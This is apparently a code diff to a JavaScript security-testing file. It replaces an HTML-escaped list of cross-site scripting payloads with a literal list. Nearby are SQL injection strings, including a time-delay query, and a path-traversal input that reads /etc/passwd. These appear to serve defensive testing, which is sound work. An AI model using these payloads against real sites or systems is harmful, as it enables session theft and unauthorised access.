@@ -457,22 +457,14 @@ const SQL_INJECTION_PAYLOADS = [
   "' WAITFOR DELAY '0:0:5'--",
 ];
 
-const XSS_PAYLOADS_ESCAPED = [
-  "&lt;script&gt;alert(1)&lt;/script&gt;",
-  "&lt;img src=x onerror=alert(1)&gt;",
-  "javascript:alert(document.cookie)",
-  "&lt;svg onload=alert(1)&gt;",
-  '"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;',
-  "&lt;body onload=alert(&#39;XSS&#39;)&gt;",
+const XSS_PAYLOADS = [
+  '<script>alert(1)<\/script>',
+  '<img src=x onerror=alert(1)>',
+  'javascript:alert(document.cookie)',
+  '<svg onload=alert(1)>',
+  '"><script>alert(document.domain)<\/script>',
+  "<body onload=alert('XSS')>",
 ];
-
-function unescapePayload(s) {
-  return s
-    .replace(/&lt;/g,'<').replace(/&gt;/g,'>')
-    .replace(/&amp;/g,'&').replace(/&quot;/g,'"').replace(/&#39;/g,"'");
-}
-
-const XSS_PAYLOADS = XSS_PAYLOADS_ESCAPED.map(unescapePayload);
 
 const CMD_INJECTION_PAYLOADS = [
   "../../../etc/passwd",
